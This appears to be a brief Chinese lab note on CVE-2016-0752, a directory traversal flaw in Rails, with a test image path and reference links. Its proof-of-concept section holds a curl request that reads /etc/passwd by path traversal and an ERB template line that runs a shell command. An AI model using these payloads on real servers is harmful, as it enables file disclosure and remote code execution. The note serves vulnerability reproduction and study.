### CVE-2016-0752 - rails 框架目录遍历漏洞

测试镜像

* src/ruby-rails/4.0.8/

参考链接

* [forced-request/rails-rce-cve-2016-0752 - Exploiting CVE-2016-0752](https://github.com/forced-request/rails-rce-cve-2016-0752)
* [Rails Dynamic Render to RCE (CVE-2016-0752)](https://nvisium.com/resources/blog/2016/01/26/rails-dynamic-render-to-rce-cve-2016-0752.html)

Poc

```
# 包含文件
curl 'http://127.0.0.1/users/%2fetc%2fpasswd'

# <%= `cp /etc/passwd /tmp` %>
# 还可以在模板里执行命令
```

